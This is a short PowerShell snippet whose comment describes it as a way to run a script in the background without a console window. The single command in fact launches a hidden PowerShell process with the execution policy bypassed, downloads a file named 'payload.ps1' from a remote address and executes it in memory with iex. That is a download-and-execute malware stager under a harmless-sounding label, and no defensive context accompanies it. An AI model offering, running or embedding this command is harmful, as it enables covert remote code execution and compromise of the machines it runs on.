# Script to run a PowerShell script in the background without showing a console window
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command (New-Object Net.WebClient).DownloadString('http://0.0.0.0:8000/payload.ps1') | iex" -WindowStyle Hidden
